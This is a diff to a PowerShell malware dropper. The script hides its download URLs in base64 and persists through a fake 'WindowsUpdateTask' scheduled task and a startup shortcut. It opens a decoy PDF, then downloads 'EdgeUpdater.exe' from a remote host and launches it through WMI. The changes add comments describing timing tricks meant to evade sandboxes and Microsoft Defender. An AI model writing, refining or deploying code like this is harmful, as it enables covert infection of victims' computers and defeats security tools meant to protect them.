@@ -21,6 +21,7 @@ function Save-ScriptToDisk {
 }
 $scriptPath = Save-ScriptToDisk -Destination $localPath
 
+# Persistence: Scheduled Task
 $taskName = "WindowsUpdateTask"
 $taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
 if (-not $taskExists) {
@@ -35,6 +36,7 @@ if (-not $taskExists) {
     } catch {}
 }
 
+# Persistence: Startup LNK
 $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
 $lnkPath = "$startupPath\WindowsUpdateHelper.lnk"
 if (-not (Test-Path $lnkPath)) {
@@ -46,8 +48,9 @@ if (-not (Test-Path $lnkPath)) {
     $shortcut.Save()
 }
 
-Start-Sleep -Seconds (Get-Random -Min 2 -Max 8)
-Start-Sleep -Seconds (Get-Random -Min 20 -Max 30)
+# === QUICK DECOY PDF OPEN (Minimal Delay) ===
+# Only a tiny random sleep (0.5–1.5 sec) to avoid looking like an immediate sandbox detonation
+Start-Sleep -Milliseconds (Get-Random -Min 500 -Max 1500)
 
 $cache = "$env:APPDATA\Microsoft\Windows\Caches"
 if (-not (Test-Path $cache)) { New-Item -ItemType Directory -Path $cache -Force | Out-Null }
@@ -57,19 +60,30 @@ $isFirstRun = -not (Test-Path $flagFile)
 
 $pdfUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9OYWthel9Oby5fNjYxX3ZpZF8wMi4wMy4yMDI2LnBkZg=='))
 $exeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9FZGdlVXBkYXRlci5leGU='))
-$pdfPath = "$cache\doc.pdf"
+$pdfPath = "$cache\doc.pdf"   # matches decoy filename
 $exePath = "$cache\helper.exe"
 
 $headers = @{'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'}
 
+# Download PDF (first run only)
 if ($isFirstRun -and -not (Test-Path $pdfPath)) {
     try {
         Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -Headers $headers -UseBasicParsing
     } catch {}
 }
 
-Start-Sleep -Milliseconds (Get-Random -Min 1500 -Max 4000)
+# Open PDF IMMEDIATELY after download (or if cached)
+if ($isFirstRun -and (Test-Path $pdfPath)) {
+    try { Start-Process $pdfPath } catch {}
+    New-Item -Path $flagFile -ItemType File -Force | Out-Null
+}
 
+# === BEARFOOS EVASION: Long delay before EXE ===
+# This 45-90 second gap is what keeps Defender quiet.
+# We'll use that time to download the EXE quietly in the background.
+Start-Sleep -Seconds (Get-Random -Min 45 -Max 90)
+
+# Download EXE (with retry) – only after the long delay has passed
 if (-not (Test-Path $exePath)) {
     $retryCount = 0
     $maxRetries = 3
@@ -84,13 +98,7 @@ if (-not (Test-Path $exePath)) {
     } while ($retryCount -lt $maxRetries)
 }
 
-if ($isFirstRun -and (Test-Path $pdfPath)) {
-    try { Start-Process $pdfPath } catch {}
-    New-Item -Path $flagFile -ItemType File -Force | Out-Null
-}
-
-Start-Sleep -Seconds (Get-Random -Min 45 -Max 90)
-
+# Launch EXE
 if (Test-Path $exePath) {
     try {
         $wmiParams = @{
@@ -108,6 +116,7 @@ if (Test-Path $exePath) {
     }
 }
 
+# Cleanup after 5 minutes
 Start-Job -ScriptBlock {
     param($exe, $pdf)
     Start-Sleep -Seconds 300
